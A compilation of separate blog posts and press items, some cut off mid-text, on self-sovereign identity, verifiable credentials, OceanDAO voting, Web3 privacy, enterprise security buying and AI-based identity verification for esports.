the modern slave trade is a bad thing, not a good&nbsp;thing.</p><p>Our particular focus was innovation and competition around the issue of ‘unequal access to user data’. Here, we pointed out, there are two possible types of innovation and competition. The first is innovation and competition around who is most efficient and effective at hoovering up individuals’ personal data and monetising it to line the pockets of their shareholders. The second is innovation and competition around who is most efficient and effective in enabling individuals to access and use their own data for their purposes.</p><p>In other words, the issue is not ‘innovation’ and ‘competition’ in the abstract, but what sort of innovation and competition the Digital Markets Unit chooses to ‘holistically’ address. One of the core suggestions we made therefore is that the DMU should be required to develop a set of criteria — open to public debate and scrutiny — that defines whether any particular innovation is desirable and therefore to be encouraged, or&nbsp;not.</p><p>Unfortunately, the way the UK Government’s questions were framed in this consultation give the impression that the only market it really has in mind is that of more efficient, effective data monetisation and exploitation. Operating on this assumption would take us back to where we were before the CMA wrote its&nbsp;report.</p><p>We did our best to explain why this would be a terrible idea; why empowering individuals with their own data is the only sensible, fair and economically efficient way forward. This issue lies at the heart of everything the Government does in this space, including the shape and content of its new National Data Strategy. It has yet to be resolved. And it’s not going to go&nbsp;away.</p> Joining the&nbsp;dots <p>This is all the more important given the proliferation of other consultations and initiatives currently under way, all of which raise the same core question. These&nbsp;include:</p>  Data: A New Deal consultation to reform data protection regulations  National Data&nbsp;Strategy  Single Login for Government  National Identity and Attributes Trust Framework  Open Finance  Pensions Dashboard programme  Modernisation of Lasting Power of&nbsp;Attorney  NHS consultation on data&nbsp;sharing  Scottish Attribute Provider&nbsp;Service  <p>Is there anyone in Government joining the dots between these different initiatives? If not, is there any chance of the UK ever developing a coherent, positive strategy for personal&nbsp;data?</p> <p><a href="https://medium.com/mydex/the-right-sort-of-competition-e505eaadc662">The Right Sort of Competition</a> was originally published in <a href="https://medium.com/mydex">Mydex</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

<p>Protecting user data from <a href="https://academy.affinidi.com/can-ssi-safeguard-your-information-from-hackers-1b256d3eb6cd">identity fraud</a> has become challenging for businesses in this dynamic environment shaped by privacy and security concerns.</p><p>While centralized and <a href="https://academy.affinidi.com/compare-and-contrast-federated-identity-vs-self-sovereign-identity-227a85cbab18">federated identity</a> management systems may seem like a good idea in terms of user access and convenience, it is also fraught with issues such as security threats, siloed data, poor user control, and&nbsp;more.</p><p>A possible solution to these problems is <a href="https://academy.affinidi.com/self-sovereign-identity-what-you-can-cant-do-with-ssi-1284f7227b4e">Self-Sovereign Identity (SSI)</a>, a revolutionary identity framework that empowers users to determine where their data is stored, how it is used, and with whom it is shared. A popular way to implement SSI is through <a href="https://academy.affinidi.com/what-are-verifiable-credentials-79f1846a7b9">Verifiable Credentials (VCs)</a> and <a href="https://academy.affinidi.com/demystifying-decentralized-identifiers-dids-2dc6fc3148fd">Decentralized Identifiers (DIDs)</a>, two W3C standards that create a common layer for user authentication and verification.</p><p>A DID is a unique identifier built on the Distributed Ledger Technology (DLT) and it is linked to a DID document, that in turn, contains information about an entity. A VC, on the other hand, is a cryptographically verifiable and machine-readable credential of an entity such as the date of birth, government ID, vaccination records, employment details,&nbsp;etc.</p><p>Now comes the big question — how are VCs tied to an entity’s identity in any application?</p> VC Issuance and Verification <p>To understand the relationship between <a href="https://academy.affinidi.com/8-reasons-to-use-verifiable-credentials-300833276b52">VCs</a> and DIDs, let’s talk briefly about the <a href="https://github.com/affinityproject/affinidi-core-sdk">issuance and verification process</a>.</p><p>There are three parties involved in VC issuance and they&nbsp;are:</p>  Issuer — the entity issuing the VC. For example, the Motor Vehicle department issuing a <a href="https://academy.affinidi.com/protecting-your-drivers-license-a-use-case-for-verifiable-credentials-25d22aeac05b">driver&nbsp;license</a>  Holder — the owner of the VC. For example, the individual who owns the&nbsp;license  Verifier — the entity verifying the authenticity of the VC. For example, a police authority who wants to issue a speeding&nbsp;ticket.  <p>Together, these three entities form what’s called a <a href="https://academy.affinidi.com/what-is-the-trust-triangle-9a9caf36b321">trust triangle</a>, and this is a key requirement for implementing SSI. The trust aspect among these entities is handled by <a href="https://academy.affinidi.com/role-of-public-key-cryptography-in-self-sovereign-identity-8c2dc37a2bf3">public-key cryptography,</a> a pair of private and public keys that always work together.</p><p>The process begins when an issuer creates a VC about the holder and digitally signs it with its private key. The holder, on receiving this VC, uses the issuer’s public key to decrypt the information, and store it in his or her <a href="https://academy.affinidi.com/5-reasons-to-use-an-identity-wallet-c289ba2980cf">digital&nbsp;wallet</a>.</p><p>When the holder wants to share this VC with a verifier, he or she creates a verifiable presentation that contains one or more VCs such as date of birth, driver’s license, address, etc, and signs it with his or her private&nbsp;key.</p><p>The verifier decrypts the VC with the holder’s public key to access the information and authenticates that it came from the right source by using the issuer’s public&nbsp;key.</p> Role of Decentralized Identifiers <p>A DID is a unique identifier that is linked to a DID document through a DID&nbsp;method.</p><p>Essentially, the DID method resolves the DID and helps to locate the associated DID document. You can imagine it to be something similar to what a URL would do to locate the web server containing information.</p><p>This DID method is implementation-specific and varies according to the network or distributed ledger where it is implemented. The DID document, on the other hand, contains information about the entities involved in JSON&nbsp;format.</p> Link Between VCs and&nbsp;DIDs <p>To answer the question of how <a href="https://academy.affinidi.com/faqs-on-verifiable-credentials-and-self-sovereign-identity-3c3a505878bc">VCs</a> are linked to identity across applications, we must understand how VCs are linked to&nbsp;DIDs.</p><p>Earlier, we said that the DID document contains information about the entities, and this includes information about their public keys and the cryptographic algorithm used. This information is then used for verifying the identity of the entities.</p><p>Here’s a sample DID document.</p> {   “@context”: [      “https://www.w3.org/ns/did/v1",      “https://w3id.org/security/suites/ed25519-2020/v1"    ]  “id”: “did:example:123456789abcdefghi”,  “authentication”: [{      // used to authenticate as did:…fghi      “id”: “did:example:123456789abcdefghi#keys-1”,      “type”: “Ed25519VerificationKey2020”,      “controller”: “did:example:123456789abcdefghi”,      “publicKeyMultibase”: “zH3C2AVvLMv6gmMNam3uVAjZpfkcJCwDwnZn6z3wXmqPV”   }]  } <p>In other words, DIDs contain information that can verify the authenticity of a&nbsp;VC.</p> Workflow of DIDs and&nbsp;VCs <p>To further elaborate, let’s look at how VCs and DIDs come together from an implementation standpoint.</p> Step 1 — Creating a&nbsp;DID <p>The first step is to create a DID using a specific DID method. The issuer can decide to create a new DID for each VC or use the same DID for all VCs issued to a&nbsp;holder.</p> Step 2 — Adding Information to the DID&nbsp;Document <p>The cryptographic keys of the DID are updated in the DID document.</p><p>Next, the issuer has to collect and/or verify the identity of the holder as required. The exact process of this step would depend on the type of credential. For example, VCs for proving that the holder is more than 21 years requires less stringent verification than issuing a driver’s&nbsp;license.</p><p>The issuer takes this responsibility of verification and accordingly issues a VC to the&nbsp;holder.</p> Step 3 — Signing the&nbsp;VC <p>The VC issued by the issuer contains the DID of both the issuer and the holder and it is digitally signed with the issuer’s DID. After the signing process, the issuer sends the VC to the&nbsp;holder</p> Step 4 — Revoking a&nbsp;VC <p>At a later point, the issuer can choose to revoke the VCs issued, especially if they are no longer related to the holder. While many implementations don’t support <a href="https://academy.affinidi.com/everything-you-need-to-know-about-vc-revocation-846e47ce3e90">VC Revocation</a>, Affinidi’s <a href="https://github.com/affinityproject/affinidi-core-sdk">tech stack</a> has simple methods to revoke&nbsp;VCs.</p> Step 5 — Verifying the&nbsp;VC <p>The holder creates a verifiable presentation consisting of one or more VCs and shares it with a verifier.</p><p>The verifier has to resolve the DID documents from the DID of the issuer and the holder present in the VC.

 Towards compound growth in Ocean ecosystem  Punchline <p>OceanDAO is a grants DAO where anyone can propose a project, and each OCEAN holder can vote “yes” or “no” for a&nbsp;project.</p><p>It’s great for the Ocean ecosystem if OCEAN holders thoughtfully vote “yes” and “no” on OceanDAO proposals, to curate towards projects with the best chance of growing the Ocean ecosystem (“thoughtful” voting).</p><p>Voting “no” across all projects with the hope that the burn will drive OCEAN price is simply irrational. It’s too small of a burn to make a dent for the near term, and it hurts the ability to grow value in the longer&nbsp;term.</p><p>If you care about the value of your OCEAN, then please vote, thoughtfully.</p> 1. Introduction <p>This article provides background to better understand the “punchline” presented above. Ocean is designed to mirror Amazon’s successful dynamics. The keys are decentralized funding, curation, and a focus on compound growth (vs dividends).</p><p>The rest of this article is organized as&nbsp;follows.</p>  Sections 2–4 describe Amazon. Sections 2 &amp; 3 describes the Amazon flywheel. Section 4 describes how Amazon focuses revenue on growth rather than shareholder dividends. From this, it’s been able to grow like crazy and create longstanding shareholder value.  Sections 5–8 draw a parallel to Ocean. Sections 5 &amp; 6 describes how Ocean’s token design is modeled after the Amazon flywheel. Section 7 describes how Ocean design focuses on growth to create longstanding value. Section 8 describes how OceanDAO voting plays a big&nbsp;role.   2. The Amazon&nbsp;Flywheel <p>Over 25 years, Amazon has grown from a struggling online bookstore to a globally pervasive company with a trillion dollar market&nbsp;cap.</p><p>Its flywheel was key to success: if Amazon selection grows, then customer experience can’t help but improve; then sales can’t help but grow; then the number of sellers can’t help but grow; then selection can’t help but grow. And the loop continues.</p>The Amazon loop. Source: Amazon.com 3. Amazon Flywheel Components <p>Two key components in this flywheel are (1) its decentralized workers and (2) its resource allocation algorithm.</p>  Amazon has (1) a sea of two-pizza teams, each running fairly independently, each with its own profit &amp; loss. It’s the “workers” block in the image&nbsp;below.  Each team is (2) funded by Amazon HQ according to a resource-allocation algorithm — the “curation” block in the image below. The more ROI a team delivers, the more funding they get. When getting going, they get a bit of time to start — typically months — to start delivering ROI. If they can’t deliver, the project gets shut down and team disbanded.  Amazon’s flywheel, including curation of $ (top left), role of workers (middle), and role of dividends (bottom&nbsp;right) 4. Amazon Growth vs Dividends <p>The revenue for these teams comes as a cut of&nbsp;sales.</p><p>Amazon takes a cut from the sales and aggressively plows it into growth. (“curate” box in the image). It explicitly does not put much into shareholder dividends (“lower-bound-shareholder rewards” in image). This is because money into growth gives benefits that compound over time, whereas dividends are a one-time&nbsp;payoff.</p><p>For example, if Amazon spends R&amp;D money to reduce its logistics costs by 2%, then it can keep reaping those savings for years to come. In contrast, Amazon did a dividend or a stock buyback, it would be a one-time benefit to shareholders and then the money is&nbsp;gone.</p><p>The best way to grow shareholder value is to grow revenue. It would only be rational for Amazon to give dividends if it couldn’t efficiently allocate its capital to growth (ROI &gt; 1). When you see Amazon start to dole out lots of dividends, it means growth has&nbsp;slowed.</p><p>Interestingly, many companies religiously aim to give dividends every year. IBM is famous for it. Unsurprisingly, their growth is tepid, and has been for&nbsp;decades.</p> 5. The Ocean Sustainability Loop <p>Amazon shows how well flywheels can work, including with decentralized workers and an algorithm to allocate resources. This gives Amazon an interesting <a href="https://medium.com/@trentmc0/tokenize-the-enterprise-23d51bafb536">path to decentralization</a>. More usefully to for us: we can use this flywheel as a model for decentralized business models. We call it the <a href="https://blog.oceanprotocol.com/the-web3-sustainability-loop-b2a4097a36e">Web3 Sustainability Loop</a>. We use it as the beating heart of Ocean’s token&nbsp;design.</p><p>If Ocean data selection grows, then data buyer experience can’t help but improve; then data sales can’t help but grow; then the number of data sellers can’t help but grow; then data selection can’t help but grow. And the loop continues.</p> 6. Ocean Sustainability Loop Components <p>Two key components in Ocean’s loop are (1) its decentralized workers and (2) its resource allocation algorithm.</p>  Ocean has (1) a sea of OceanDAO-funded teams, each running fairly independently, each with its own profit &amp; loss. It’s the “workers” block in the image&nbsp;below.  Each team is (2) funded by OceanDAO according to its resource-allocation algorithm: voting. This is the “curation” block in the image below. The more ROI a team delivers, the more funding they can expect over time. When getting going, they get a bit of time to start — to start delivering ROI. If they can’t deliver, the team should not expect to receive further&nbsp;grants.  Ocean Sustainability Loop is an instance of Web3 Sustainability Loop&nbsp;pattern<p>Ocean is an ecosystem. There are way more teams than just OPF core team working to build and grow the Ocean ecosystem. Here are examples of work funded by OceanDAO.</p>  Ocean documentation. These have matured greatly in the last half year, thanks to Akshay. Work includes: search, ocean.py API, Provider API, Aquarius API, and (currently) documentation for&nbsp;V4.  Deep Gaia-X engagement. OPF core team has been engaged with Gaia-X a long time. However this engagement has become broader and stronger thanks to work by grant recipients (deltaDAO).  Vote with datatoken pools. This was accomplished by a grant (Tim Daubenshuetz).  Moderation of TG, Discord, and other channels. This is done by the Ocean Ambassadors grants recipients.  Learn about Ocean. The Ocean Academy team created tons of awesome material to onboard people about Ocean. It’s become so good, that doing Ocean Academy is a pre-requisite for people to become Ocean Ambassadors.  Learn about OceanDAO grants. The Ocean Pearl team has created a gorgeous frontend (oceanpearl.io) to browse, search and filter OceanDAO grants recipients. The scope is increasing to support other OceanDAO flows such as&nbsp;voting.   7. Ocean Growth vs&nbsp;Burning <p>The revenue for OceanDAO teams comes from OPF treasury, 51% rewards, and (with traction) Network&nbsp;Revenue.</p><p>Ocean is designed to aggressively plows Network Revenue into growth. (“curate” box in the image). It explicitly puts just 5% — a low amount — into burning (bottom left image). This is because money into growth gives benefits that compound over time, whereas burning is a one-time&nbsp;payoff.</p><p>For example, if OceanDAO grants R&amp;D money to a new app that adds 100,000 participants to Ocean ecosystem, those people will stick around for years to come, assuming they’re getting value from the app. Network Revenue would flow to the Ocean community accordingly.</p><p>In contrast, in a burn situation, it a one-time benefit to OCEAN holders and then the money is&nbsp;gone.</p><p>Burning actually happens in two places: (a) 5% of Network Rewards, as described, and (b) any OceanDAO funds not allocated in a given funding cycle, i.e. not enough projects with a sufficient “yes” vote to use up the funds available.</p><p>The best way to grow OCEAN value is to grow Network Revenue. It would only be rational for OceanDAO to burn its funds it couldn’t efficiently allocate its capital to growth (ROI &gt;&nbsp;1).</p><p>We’ve actually built TokenSPICE simulations that validate this (at least with the model assumptions). In scenario A, we ran at 95% of Network Revenue to OceanDAO, and 5% to burning. In scenario B, the opposite. The results: in 10 years, predicted market cap was about 10x higher for scenario A. Focus on growth creates the most value for OCEAN holders, because it compounds. Burning is a one-time&nbsp;payoff.</p> 8. OceanDAO Voting &amp; Ocean&nbsp;Growth <p>Let’s drill in on voting in OceanDAO.</p><p>What’s rational: voting “yes” for projects that you think have a good chance to help grow Ocean (expect ROI &gt; 1 over&nbsp;time).</p><p>What’s rational: voting “no” for projects that you think don’t have a good chance (ROI &lt;1 and will never get&nbsp;better)</p><p>What’s less rational: voting “no” on all projects because you think burning will help drive the price of Ocean. This less rational because the amount burned is so low that it won’t dent the price of OCEAN. Even more importantly, it means the ecosystem isn’t getting funded — precisely where the growth needs to&nbsp;be!</p><p>Put another way, ask yourself: can I expect more returns to OCEAN from this project in the next 6–18 months, versus burning? If yes, then vote yes. If no, then no. Burning is the lower-bound measuring stick for assessing value&nbsp;add.</p> 9. Conclusion <p>This article reviewed the Amazon flywheel and how Ocean’s token dynamics mirror them. It highlighted that value creation comes from funding for growth, which gives compound rewards over time. Contrast this to burning which is only a one-time payoff (and is money taken from&nbsp;growth).</p> <p><a href="https://blog.oceanprotocol.com/on-voting-in-oceandao-8f7e07d40e9d">On Voting In OceanDAO</a> was originally published in <a href="https://blog.oceanprotocol.com">Ocean Protocol</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

 By <a href="https://beincrypto.com/author/gloria-wu/">Gloria Wu&nbsp;, Chief of Ecosystem Partnerships at&nbsp;Ontology</a> <p>The internet is currently in a liminal phase. It is sitting on the precipice of changes that will shake up human life in ways that we could have only imagined ten years ago. Web3 is the internet’s third iteration. It is seeing the digital sphere become more open-source.</p><p>A transparent community of developers is building this new web. It means it is trustless — participants can interact without intermediaries harvesting their data. Finally, it means it is permissionless — that anyone can participate without the need for a governing body.</p><p>Under the correct guiding principles, Web 3.0 can offer an internet that is more decentralized, open, and secure. To make this a reality, individuals as opposed to corporations and privacy as opposed to profits must have sovereignty in Web&nbsp;3.0.</p> Looking back to move&nbsp;forward <p>Web 2.0 was defined by innovations such as smartphone technology, social media, and cloud computing. In tandem with these developments, data processing and collection quickly grew legs. It became a source for capital gains and marketing success with little regulation in place on data harvesting and its&nbsp;uses.</p><p>Policymakers have begun to police this through laws such as <a href="https://gdpr-info.eu/">GDPR</a> and <a href="https://www.esma.europa.eu/policy-rules/mifid-ii-and-mifir">MiFID ii</a> in Europe. In addition to updated <a href="https://www.cnbc.com/2021/06/22/tech-industry-urges-congress-to-slow-down-new-antitrust-bills.html">antitrust laws</a> aimed at increasing consumer protection in the United&nbsp;States.</p><p>Ultimately, however, the underlying problem is that data is a valuable commodity. However, data protection is not something that chimes with the interests of big corporations.</p> The privacy&nbsp;failure <p>As well as facilitating an internet economy that thrives through data harvesting, Web 2.0 has failed to protect consumers’ privacy. This is because most data is stored on centralized platforms such as computer files and databases.</p><p>This makes data extremely vulnerable to losses, alterations, and hacks. Last year saw more than <a href="https://www.infosecurity-magazine.com/blogs/top-5-data-breaches-in-history/">37 billion</a> records exposed due to just under 4000 data breaches in the&nbsp;U.S.</p><p>It’s not just <a href="https://www.nytimes.com/2021/09/02/business/facebook-whatsapp-privacy-fine.html">Big Tech</a> giants, like Watsapp and Amazon, that are in hot water when it comes to <a href="https://beincrypto.com/learn/top10-must-have-cryptocurrency-security-tips/">security</a>. National health services such as the Health Service Executive (<a href="https://www.bbc.com/news/world-europe-58413448">HSE</a>) in Ireland, as well as <a href="https://www.bbc.com/news/uk-england-kent-57404917">schools</a> and <a href="https://www.bbc.com/news/business-57447404">restaurants</a> around the world, have all been implicated in significant data breaches this year. Therefore, showing how centralized systems can no longer provide users with the data protection they&nbsp;need.</p><p>Centralized bodies are often required to exchange data with different companies to function. For instance, when a bank must seek information from a loan provider on a customer’s repayment history.</p><p>Moving this data creates a new copy. With that copy, an opportunity arises for loss or incorrect data to be replicated or&nbsp;altered.</p><p>Web3 is perfectly placed to remedy the existing failures of these centralized systems. In addition, it can place privacy at the forefront of all technological developments.</p><p>Using a decentralized data storage system can ensure that each entity involved in data exchange has access to a real-time, shared view of the data when permission is granted by the person in control. Therefore, reducing the risk of malpractice.</p> Web3 and decentralized identities <p>Another essential part of the decentralization of Web3 will be the creation of secure digital identities.</p><p>The current model of online identity verification on the web is old and fraught with vulnerabilities. To do almost anything interactive, we have to supply valuable personal information. This comes with little oversight into how it is shared and protected.</p><p>Decentralized identity solutions already exist in the form of applications built on blockchain. These allow users to maintain autonomous control over their private data. They can then decide if and when to share it by granting access through private&nbsp;keys.</p><p>In the next phase of internet development and communication, decentralized metaverses, spaces where virtual worlds (such as games and forums) and the real world collide, are also becoming a reality. Different games will be linked up to each other, as well as to other virtual arenas like online shops or virtual <a href="https://beincrypto.com/learn/top-blockchain-cryptocurrency-events-2020/">events</a> platforms.</p><p>To ensure the seamless integration of these worlds, users have to be able to move between different parts of the metaverse with a consistent identity. All while ensuring their data and privacy is respected.</p><p>Decentralized identity solutions can allow users to create one decentralized username and password. This then allows them to access multiple different platforms securely. Therefore, making them a perfect solution in an integrated decentralized metaverse world.</p> Priorities in&nbsp;Web3 <p>Every blockchain or layer two network must wrestle with tradeoffs such as speed or block size. A given developer’s goals influences these decisions.</p><p>As such, priorities for the ecosystem will have to be set when developing a blockchain for Web3. Open, trustless, decentralized networks that value privacy and security should be prioritized. The principle of interoperability is part of this too. Creating one blockchain to facilitate all users’ needs goes against the decentralized principles that underlie blockchain technology.</p><p>There will be many blockchains and layer two protocols coexisting and providing different services. The task is to ensure that they can communicate seamlessly with one another. Thus, creating a safe and secure Web3 that places users’ needs ahead of those of corporations.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

The Indicio Transaction Endorser Wizard takes the guesswork out of putting together the right components for a ledger write which means you can get your customers to go live with their products and services&nbsp; in minutes and not hours or&nbsp; days.</p>
<p>Writing to any Hyperledger Indy-based network can be time consuming and complicated.&nbsp; As more companies turn to trusted data ecosystems and verifiable credential technologies to share information in a secure, privacy-preserving way, IT organizations have to take on the challenge of writing to the ledger for their own products and services—as well as endorsing writes for their customers.</p>
<p>These processes, which involve creating decentralized identifiers (DIDs) and schema combination for Hyperledger Indy networks require a high level of technical skill and coordination. The Indicio Transaction Endorser Wizard solves this problem by making writing to the ledger simpler, quicker, and easier to scale. This helps you get to market quicker, expand your market, and grow your business as an endorser for your customers.</p>
<p>“Writing transactions and orchestrating multiple writes from multiple parties is a new core business activity,” said Heather Dahl, CEO, Indicio. “For decentralized identity to scale, for companies to get to market, we need to make these&nbsp; processes as frictionless as possible. For products and services involving multiple customers that all want to issue verifiable credentials this can mean hundreds of ledger writes to a network. The Transaction Endorser Wizard makes this possible&nbsp; in minutes instead of&nbsp; hours for even the most knowledgeable teams. This is an essential tool for scaling decentralized identity solutions for everyone.”</p>
<p>Indicio Transaction Endorser Wizard subscribers get:</p>

  <p>by <a href="https://www.kuppingercole.com/team/fisher">Paul Fisher</a></p><p>In today’s business environment, companies have three major challenges – making a profit, finding great people, and staying ahead of the competition. That’s quite enough, but they also have major operational challenges with IT, cyber security, and compliance. For example, IBM Security Services reports that it’s not unusual for clients to have more than 15 different cloud providers – and probably more they don’t know about. How do business and IT leaders deal with that when they don’t even know how many clouds there are, or what data resides on those multiple clouds? They can appoint new people into new privacy and security positions to cope but is that enough? Given the cyber threats the business now faces, it most likely is not.</p>
 Hail to the chief security officer 
<p>Most recently, the number of companies falling victim to ransomware attacks has seen a steep increase. The fear that ransomware and other forms of cyber-attack will have a serious impact on the US economy led to President Biden’s Executive Order on radically improving cyber security within Federal Agencies. This seriously upped the game for those vendors that wish to supply into the Federal Sector, and the rigorous standards they will now have to meet.</p>
<p>The Executive Order is far reaching and will have an impact on the private sector where the cyber threat is no less acute. The order states: “The trust we place in our digital infrastructure should be proportional to how trustworthy and transparent that infrastructure is, and to the consequences we will incur if that trust is misplaced.”&nbsp;This almost perfectly describes the situation that many private companies now find themselves in when looking for partners to improve their own security posture against the worsening threat landscape – trust is all important as is the ability to provide modern scalable security platforms that are compatible with legacy platforms.</p>
 What IT buyers are looking for now, and why 
<p>Buyers are looking for an integrated approach to data security, privacy and governance – and looking for trusted partners to provide such solutions. The major challenge is that IT infrastructures for many organizations are of necessity more complex as they seek to make progress on digital transformation with clouds, infrastructure as code, third party and customer identity management etc. – and this has made a consistent approach to security and governance harder. Too often, incompatible legacy solutions are preventing a fully joined up holistic approach to security and governance and creating pain points across the enterprise. With modality now the order of the day for larger enterprises clients want to see vendors and service providers who understand the customer’s pain points and how they are trying to address it, reaching further into relationships that scale and mature.</p>
 Finding the data and then protecting it is not easy 
<p>Understanding data is central to innovation, efficiency and productivity and therefore its protection is paramount. To make use of data, teams must know where it is. Data on customer behaviour is hugely valuable to defining new services and products but it’s also sensitive and needs protecting. Thales, a global digital identity and security company, advises that encryption is a good solution, but it too must be managed, be best in breed so that it 100% protects data but does not stand in the way of access to those that need it. Encrypted data is useless to hackers, but it is also no good to users if they cannot decrypt what they need with zero latency.</p>
<p>There is of course no silver bullet when it comes to protecting data and applications but for any security infrastructure to succeed following an internationally recognised framework such as NIST is advisable. It helps with purchase decisions, deployment and operation to follow accepted and recognised patterns and will also help with meeting compliance demands. The best IT services providers and integrators will be able to ensure that any security project or data protection platform follows recognised and suitable frameworks that also fit the culture, operations and market obligations of the client.</p>
<p>Clients do not want to rip out legacy technologies to conform to an individual platform – so solutions must have as many integrations as possible – a “perfectly baked cake” that covers the full spectrum of integrations that plays nicely with other applications in the stack. Of course, writing this is simple, doing it is much harder and few organizations these days can achieve security solutions suitably hardened and stressed tested against compliance standards and known vulnerabilities without expert help that understands business.</p>
 Poor security costs more than dollars 
<p>The cost of inadequate or badly configured IT security is not just measured in lost production or through ransomware payments but also in loss of reputation and brand damage after a breach. And, since the emergence of consumer privacy regulations such as the EU GDPR, organizations have had to ensure that they protect PII or be subject to fines. This comes at the same time as enterprises are introducing more consumer focused digital services putting further emphasis on protecting customer data. If that is not secured any new digital relationship with customers (CIAM) will not work – the trust will not be there. In those less regulated markets where Privacy Regulation are less severe this may matter less in dollar terms but a reputation for good security and looking after customer data will do brands no harm at all in any market.</p>
<p>Increasingly businesses should see spend on cybersecurity not as cost but as an investment – in the company, its people and its future. Further, in the joined up interconnected supply chains we are accustomed to – companies increasingly wish to do business with other companies that proactively think about security – and can be seen to tangible taking steps to be as secure as possible.</p>
<p>It is about reputation with customers and partners in supply chain. It is about competitive positioning. For example, legacy financial institutions need to compete with more agile cloud native FinTechs who may have a more baked in security layer. To compete they will demand a security and privacy fabric entwined with their clouds and, importantly, legacy infrastructures – and they will look to trusted IT partners to provide this.</p>

This collaboration marks a major milestone in the energy vertical of the Ocean data ecosystem.</p><p>Energy Web is the leading decentralized energy ecosystem, trusted by influential energy companies including GE, Tepco and national operators the world over. The Energy Web consortium has more than 100 organizations. EW technology enables any energy asset owned by any customer to participate in any energy&nbsp;market.</p><p>The Energy Web Chain (EWC) “is a public, enterprise-grade blockchain platform designed for the energy sector’s regulatory, operational, and market needs. Launched in mid-2019, it has become the industry’s leading choice as the foundational digital infrastructure on which to build and run blockchain-based decentralized applications (dApps)”&nbsp;[<a href="https://www.energyweb.org/technology/energy-web-chain/">link</a>].</p><p>The teams of Ocean and Energy Web have been quietly collaborating since 2017, when both projects were at inception stages. Ocean has contributed to EW’s annual Event Horizon conference, for example with this 2019 talk “Energy Data and Access Management” [<a href="https://www.slideshare.net/TrentMcConaghy/energy-data-access-management-with-ocean-protocol">slides</a>][<a href="https://www.youtube.com/watch?v=lC50EARadwo&amp;feature=youtu.be">video</a>]. Moreover, both Energy Web and Ocean have long-standing collaborations in the Kusama / Polkadot ecosystems. Ocean and Energy Web have grown up together.</p><p>EWC is EVM-compatible, which allows it to run Ethereum smart contracts and use Ethereum-style ERC20 tokens. It’s currently a <a href="https://twitter.com/energywebx/status/1051832833579266049?lang=en">Proof-of-Authority</a> chain with a modern consensus algorithm built on <a href="https://www.parity.io/technologies/substrate/">Parity Substrate</a> technology.

<p>Settembre 2021: InfoCert riconosciuta come Leader a livello mondiale nel mercato dell’eSignature nell’IDC MarketScape: Worldwide eSignature Software 2021 Vendor Assessment (doc #US46742320, September 2021).</p>



<p>Nello studio, che ha preso in considerazione 15 tra i più importanti fornitori di soluzioni di firma elettronica a livello mondiale, in virtù delle proprie capacità e strategie connesse alla propria offerta, InfoCert si posiziona nella “Leaders category”.</p>



<p>Lo studio di IDC esamina vari fornitori di software di firma elettronica in tutto il mondo. Le soluzioni di firma elettronica sono un elemento importante per migliorare sia l’efficienza che l’esperienza dei flussi di lavoro incentrati sui contenuti tra imprese e tra imprese e consumatori.</p>



<p>In un momento storico in cui un numero crescente di documenti “nasce digitale” e le Organizzazioni continuano a digitalizzare i flussi di lavoro incentrati sui contenuti, la firma elettronica ha permesso a questi flussi di lavoro di rimanere digitali e apportare benefici, tra cui la riduzione dei tempi e dei costi delle transazioni, una maggiore sicurezza e una migliore user experience per dipendenti, fornitori, partner e clienti.</p>



<blockquote><p>Il contributo della tecnologia della firma elettronica alla continuità aziendale è diventato lampante durante la pandemia COVID-19. Le carenze sono risultate evidenti nelle Organizzazioni prive di processi aziendali completamente digitalizzati e i lavoratori in remoto hanno dovuto cercare metodi alternativi per portare avanti il lavoro.</p>Holly Muscolino – Research vice president, Content Strategies and the Future of Work</blockquote>

<p>Cheating in esports is a pressing issue as it poses a threat to all involved stakeholders. From players to developers, tournament hosts, and sponsors, if a tournament is damaged by the presence of cheaters, the fallout is never good.&nbsp;</p>
<p>Especially with esports being such a fast paced and modern environment, negative news spreads like wildfire and just one incident could have lasting repercussions, sometimes even to a point of no return.&nbsp;</p>
<p>This is why it’s vital to detect and prevent online gaming fraud and one of the best ways to do this is through the use of AI-powered identity verification systems. But what exactly does this mean and how does it all work? Let’s break it all down step by step.&nbsp;</p>
 What is AI-Powered Identity Verification? 
<p>AI-powered Identity verification is a system that combines the best of human instinct and technology with modern machine learning technology to verify the identity of users. It allows for a streamlined user experience and, with tools like IDnow’s Autoident, it can be as simple as a user uploading images of their ID documents and following on screen prompts.&nbsp;</p>
<p>The biggest advantages of using an AI-powered system are the speed and accuracy of results. It both eliminates time consuming manual inputs, as well as the risk of human error. Overall, it is a both quick and secure method to verify users identification and can be used as both a cheater prevention and age verification tool.&nbsp;</p>
 How could AI-Powered Identity Verification be used for esports? 
<p>There are many ways that an online identification system could be used in <a href="https://www.idnow.io/esports/">esports</a>. It could come as a solution to a key problem of ‘ghost accounts’ – these are new accounts created and used by cheaters when they have been caught and banned on other accounts, allowing them to cheat in a game all over again. This is one of the biggest issues, as there’s currently no real way to stop users from making new accounts and it’s especially problematic in free-to-play games, where there’s no cost to making a new account.</p>
<p>By using an AI-powered identity verification tool, accounts could only be created if they are tied to unique users, which would require official documents and proof of identity, making it much more difficult to make and obtain ghost accounts.&nbsp;</p>
<p>This would also come as a deterrent to cheating and other illicit activities in the first place, as players would be held accountable for their accounts and wouldn’t be able to play the game again if they were banned. As the tools require ID verification, it would also aid in preventing fraud and under-age gaming.&nbsp;</p>
<p>At the same time, it also provides an extra layer of security, as these verification tools can also be used as a multi-factor authentication system.&nbsp;</p>
<p>The best news is that these AI-powered identity verification systems already exist and successfully function in other markets. Let’s take a look at one example, IDnow.&nbsp;</p>
 How IDnow’s Autoident can solve esports’ cheating problem 
<p>IDnow’s Autoident can be the perfect solution to the outlined problems. It’s an AI-powered identity verification tool that makes it quick and painless for users and is thus a perfect fit for the fast paced esports world.&nbsp;</p>
<p>Verification can be as simple as downloading an ID verification app, then scanning an ID document and taking a selfie to confirm identity. This is then automatically verified through AI and users can expect results within minutes, all while following simple on screen instructions. Even if there is an issue, IDnow specialists are always available and still able to deliver speedy results.&nbsp;</p>
<p>The platform also boasts great scalability and potential for global deployment as it’s able to identify people anywhere, anytime. In fact, right now there is potential to cover 7 Billion customers from 195 different countries and considering how much of a global phenomenon gaming and esports is, this will be vital for large scale, triple A titles.&nbsp;</p>
<p>Best of all, IDnow boasts impressive proof of work, having already employed products with over 250 customers, including leading international companies like Lottoland, Bank of Scotland, and Western Union during their seven years in business.&nbsp;</p>
